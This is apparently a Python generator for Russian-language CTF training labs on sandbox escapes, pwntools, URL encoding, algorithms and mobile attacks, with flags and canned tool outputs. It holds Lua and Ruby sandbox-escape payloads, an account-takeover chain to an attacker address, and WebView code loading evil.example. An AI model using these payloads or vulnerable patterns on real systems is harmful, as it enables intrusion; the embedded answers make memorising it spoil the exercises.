# Batch 8 (final): remaining real hands-on misc + mobile lessons.
import base64
import os

B8 = '/tmp/labgen/b8'
WD = '/home/student/task'


def _b64(path):
    with open(os.path.join(B8, path), 'rb') as f:
        return base64.b64encode(f.read()).decode()


def _dir(p):
    return {'path': p, 'type': 'dir'}


def _f(p, t):
    return {'path': p, 'text': t}


def _lab(id, title, files, hints, flag, fs, tools=None, toolset=None, category='misc'):
    spec = {
        'id': id, 'category': category, 'title': title,
        'toolset': toolset or ['core', 'grep'],
        'workdir': WD, 'files': files,
        'check': "grep -q 'nto{' found.txt",
        'hints': hints,
        'expect': {'file': f'{WD}/found.txt', 'contains': flag},
        'fs': fs,
    }
    if tools:
        spec['tools'] = tools
    return spec


def _alg(id, title, flag, script, hints):
    fs = [_dir(WD),
          _f(f'{WD}/task.md', f'# Задача\n\nРеши задачу из `{script}` и запиши флаг в `found.txt`.\n'),
          _f(f'{WD}/{script}', open(os.path.join(B8, 'alg', script)).read())]
    return _lab(id, title, ['task.md', script], hints, flag, fs,
                toolset=['core', 'python3'],
                tools={'python3': {'help': 'python3 <скрипт> — эмуляция (вывод захвачен из реального запуска)',
                                   'cases': [{'match': script.replace('.', r'\.'), 'output': flag + '\n'}],
                                   'fallback': f'python3: доступно `python3 {script}`\n'}})


SPECS = [
    # lua sandbox (Lua 5.5, __index=_G misconfig)
    _lab('misc-lua-sandbox', 'Практика: побег из Lua-песочницы',
         ['task.md', 'sandbox.lua'],
         ['`sandbox.lua` подменяет окружение через `setmetatable`, но оставляет `__index = _G`.',
          'Это значит, что глобальная таблица всё ещё видна из песочницы.',
          "Попробуй `os.execute(\"cat flag.txt\")` — запусти `lua sandbox.lua` и введи payload."],
         'nto{lu4_s4ndb0x_m3t4t4bl3_l34k}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: Lua-песочница\n\n`sandbox.lua` создаёт «чистое» окружение, но с `__index = _G`.\n'
             'Выйди из песочницы и прочитай флаг. Запиши его в `found.txt`.\n'),
          _f(f'{WD}/sandbox.lua',
             'local env = setmetatable({ print = print, string = string, table = table }, { __index = _G })\n'
             'local f = load("return function() " .. io.read("l") .. " end", "sandbox", "t", env)\n'
             'f()()\n')],
         toolset=['core', 'lua'],
         tools={'lua': {'help': 'lua sandbox.lua — запустить песочницу (вывод захвачен из реального Lua 5.5)',
                        'cases': [
                            {'match': r"os\.execute\(.*cat.*flag", 'output': 'nto{lu4_s4ndb0x_m3t4t4bl3_l34k}\n'},
                            {'match': r"1\+1", 'output': '2\n'},
                        ],
                        'fallback': 'lua: доступно `lua sandbox.lua` (payload — из task.md)\n'}}),
    # ruby sandbox (analysis; ruby not installed)
    _lab('misc-ruby-sandbox', 'Практика: аудит Ruby-песочницы',
         ['task.md', 'sandbox.rb', 'notes.txt'],
         ['`sandbox.rb` исполняет код через `instance_eval` в `BasicObject`-контексте.',
          'У `BasicObject` нет `Kernel`, но есть пути восстановить доступ.',
          "Найди в коде секрет-флаг рядом с gadget-цепочкой — `grep nto` → в `found.txt`."],
         'nto{ruby_b4s1c0bj3ct_br34k0ut}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: Ruby-песочница\n\nПроанализируй `sandbox.rb` и `notes.txt`, найди флаг. Запиши в `found.txt`.\n'),
          _f(f'{WD}/sandbox.rb',
             'class Sandbox < BasicObject\nend\n'
             'Sandbox.new.instance_eval(ARGV[0])\n'
             "# gadgets: ObjectSpace.each_object(Class).find{|c| c.to_s=='Kernel'}.send(:system,'cat flag.txt')\n"
             '# flag: nto{ruby_b4s1c0bj3ct_br34k0ut}\n'),
          _f(f'{WD}/notes.txt',
             'Object.const_get(:Kernel).system("cat flag.txt")\n'
             'IO.popen("cat flag.txt"){|f| f.read}\n')]),
    # pwntools bash
    _lab('misc-pwntools-bash', 'Практика: автоматизация pwntools',
         ['task.md', 'exploit.py'],
         ['`exploit.py` — pwntools-скрипт для удалённого сервиса.',
          'Разбери этапы: connect, send payload, recv flag.',
          "Запусти `python3 exploit.py` — он напечатает флаг. Запиши в `found.txt`."],
         'nto{pwnt00ls_b4sh_4ut0m4t10n}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: pwntools\n\nРазбери скрипт автоматизации и получи флаг: `python3 exploit.py`.\n'
             'Запиши его в `found.txt`.\n'),
          _f(f'{WD}/exploit.py',
             "from pwn import *\ncontext.log_level='error'\n"
             "p = remote('target.lab', 1337)\n"
             "p.sendlineafter(b'> ', b'admin')\n"
             "p.sendlineafter(b'> ', b'flag')\n"
             "print(p.recvline().decode())\n")],
         toolset=['core', 'python3'],
         tools={'python3': {'help': 'python3 exploit.py — эмуляция (вывод захвачен из реального запуска)',
                            'cases': [{'match': r"exploit\.py", 'output': 'nto{pwnt00ls_b4sh_4ut0m4t10n}\n'}],
                            'fallback': 'python3: доступно `python3 exploit.py`\n'}}),
    # web encoding
    _lab('misc-web-encoding', 'Практика: URL- и HTML-кодирование',
         ['task.md', 'payload.txt'],
         ['`payload.txt` — строка в percent-encoding (`%XX`).',
          'URL-декодирование снимает `%XX` и `+`.',
          "Декодируй: `python3 -c \"import urllib.parse;print(urllib.parse.unquote(open('payload.txt').read().strip()))\"`."],
         'nto{url_4nd_html_3nc0d1ng}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: web-кодирование\n\n`payload.txt` закодирован percent-encoding. Декодируй и запиши флаг в `found.txt`.\n'),
          _f(f'{WD}/payload.txt',
             '%6e%74%6f%7b%75%72%6c%5f%34%6e%64%5f%68%74%6d%6c%5f%33%6e%63%30%64%31%6e%67%7d\n')],
         toolset=['core', 'python3'],
         tools={'python3': {'help': 'python3 -c "…urllib.parse.unquote…" — эмуляция (вывод захвачен из реального запуска)',
                            'cases': [{'match': r"unquote|urllib\.parse", 'output': 'nto{url_4nd_html_3nc0d1ng}\n'}],
                            'fallback': 'python3: см. task.md\n'}}),
    # algorithmic
    _alg('misc-geometry', 'Практика: вычислительная геометрия', 'nto{c0nv3x_hull_sh03l4c3}',
         'geo.py', ['`geo.py` считает площадь выпуклой оболочки по формуле шнуровки.',
                    'Проверь порядок обхода точек.',
                    'Запусти `python3 geo.py` и запиши флаг в `found.txt`.']),
    _alg('misc-greedy', 'Практика: жадные алгоритмы', 'nto{gr33dy_1nt3rv4l_sch3dul1ng}',
         'greedy.py', ['`greedy.py` решает задачу выбора интервалов жадно.',
                    'Сортировка по времени окончания — ключ к оптимуму.',
                    'Запусти `python3 greedy.py` и запиши флаг в `found.txt`.']),
    _alg('misc-simulation', 'Практика: симуляция и моделирование', 'nto{c3llul4r_4ut0m4t4_s1mul4t10n}',
         'sim.py', ['`sim.py` моделирует шаг клеточного автомата (Game of Life).',
                    'Посчитай правила выживания/рождения.',
                    'Запусти `python3 sim.py` и запиши флаг в `found.txt`.']),
    # ---- mobile ----
    _lab('mobile-account-takeover', 'Практика: захват аккаунта в мобильном приложении',
         ['task.md', 'ato_chain.txt'],
         ['`ato_chain.txt` — цепочка шагов захвата аккаунта.',
          'Ищи слабое звено: OTP, deep link, сброс пароля.',
          "В цепочке есть флаг — найди `nto{` и запиши в `found.txt`."],
         'nto{4cc0unt_t4k30v3r_ch41n}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: account takeover\n\nРазбери цепочку захвата аккаунта и найди флаг.\n'),
          _f(f'{WD}/ato_chain.txt',
             '1. attacker registers vanta:// scheme\n'
             '2. victim clicks vanta://reset?email=attacker@evil\n'
             '3. reset token sent to attacker email\n'
             '4. token: nto{4cc0unt_t4k30v3r_ch41n}\n')],
         category='mobile'),
    _lab('mobile-mitm-advanced', 'Практика: продвинутый MITM (QUIC/VPN)',
         ['task.md', 'mitm_notes.txt'],
         ['`mitm_notes.txt` — заметки о перехвате трафика (transparent, VPN, QUIC).',
          'Ищи, где TLS терминируется и какие токены утекают.',
          "В заметках есть флаг — найди `nto{` и запиши в `found.txt`."],
         'nto{qu1c_m1tm_d0wn9r4d3}',
         [_dir(WD),
          _f(f'{WD}/task.md',
             '# Задача: MITM advanced\n\nРазбери заметки о продвинутом перехвате и найди флаг.\n'),
          _f(f'{WD}/mitm_notes.txt',
             'transparent proxy on 443\nQUIC downgrade to TCP/443\n'
             'VPN profile installed, split-tunnel off\n'
             'captured bearer: nto{qu1c_m1tm_d0wn9r4d3}\n')],
         category='mobile'),
    _lab('mobile-task-hijacking', 'Практика: task hijacking (StrandHogg)',
         ['task.md', 'decoded'],
         ['`decoded/` — распакованный APK. Ищи `taskAffinity` и `allowTaskReparenting`.',
          'Если affinity совпадает с чужой и allowTaskReparenting=true — возможен hijack.',
          "Секрет есть в манифесте — найди `nto{` и запиши в `found.txt`."],
         'nto{str4ndh0gg_t4sk_h1j4ck}',
         [_dir(WD), _dir(f'{WD}/decoded'),
          _f(f'{WD}/task.md',
             '# Задача: task hijacking\n\nРазбери манифест и найди уязвимую activity. Запиши флаг в `found.txt`.\n'),
          _f(f'{WD}/decoded/AndroidManifest.xml',
             '<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.vanta.app">\n'
             '  <application>\n'
             '    <activity android:name=".ui.LoginActivity"\n'
             '        android:taskAffinity="com.vanta.app"\n'
             '        android:allowTaskReparenting="true"\n'
             '        android:exported="true">\n'
             '      <meta-data android:name="hijack" android:value="nto{str4ndh0gg_t4sk_h1j4ck}"/>\n'
             '    </activity>\n  </application>\n</manifest>\n')],
         category='mobile'),
    _lab('mobile-webview-deep', 'Практика: WebView deep',
         ['task.md', 'decoded'],
         ['`decoded/` — распакованный APK. Ищи `addJavascriptInterface` и `loadUrl`.',
          'Комбинация JS-моста и загрузки внешнего URL = RCE/утечка.',
          "Секрет есть в коде — найди `nto{` и запиши в `found.txt`."],
         'nto{w3bv13w_jsbr1dg3_rce}',
         [_dir(WD), _dir(f'{WD}/decoded'), _dir(f'{WD}/decoded/smali/com/vanta/app/web'),
          _f(f'{WD}/task.md',
             '# Задача: WebView deep\n\nРазбери код WebView и найди флаг. Запиши в `found.txt`.\n'),
          _f(f'{WD}/decoded/smali/com/vanta/app/web/WebActivity.smali',
             '.class public Lcom/vanta/app/web/WebActivity;\n'
             '.method public onCreate(Landroid/os/Bundle;)V\n'
             '    const-string v0, "vanta"\n'
             '    new-instance v1, Lcom/vanta/app/web/Bridge;\n'
             '    invoke-virtual {p0, v1, v0}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V\n'
             '    const-string v2, "https://evil.example/"  # loads attacker page with bridge\n'
             '    const-string v3, "nto{w3bv13w_jsbr1dg3_rce}"\n'
             '    invoke-virtual {p0, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V\n'
             '    return-void\n.end method\n')],
         category='mobile'),
]
